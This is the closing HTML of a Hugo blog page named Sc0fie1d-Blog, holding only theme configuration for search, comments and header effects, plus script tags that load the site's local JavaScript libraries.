    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"Hugo-DoIt/utterances-comments"}},"data":{"desktop-header-typeit":"Sc0fie1d-Blog","mobile-header-typeit":"Sc0fie1d-Blog"},"search":{"algoliaAppID":"5YGRNRQK1G","algoliaIndex":"en_index","algoliaSearchKey":"0ff6874805de24b84aa1d5ebccad56cd","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":300,"type":"algolia"},"sharerjs":true,"table":{"sort":true},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/typeit.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script><script type="text/javascript" src="/js/utterances.min.js" defer></script></div>
</body>

</html>